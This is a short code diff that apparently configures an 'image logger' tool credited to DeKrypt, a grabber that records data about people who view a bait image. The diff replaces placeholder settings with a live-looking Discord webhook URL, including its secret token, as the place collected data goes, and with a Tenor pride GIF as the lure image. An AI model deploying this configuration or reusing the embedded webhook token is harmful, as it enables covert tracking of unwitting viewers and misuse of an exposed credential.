@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1337113328505589783/rb_KfjrviIgjpXv5qOvwg80MC2thSgDX2bCdklFPh0JgZnoK5a8z_7gLXvSNEOsVvHta",
+    "image": "https://tenor.com/view/equality-rainbow-pride-happy-pride-trans-pride-gif-22108661", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
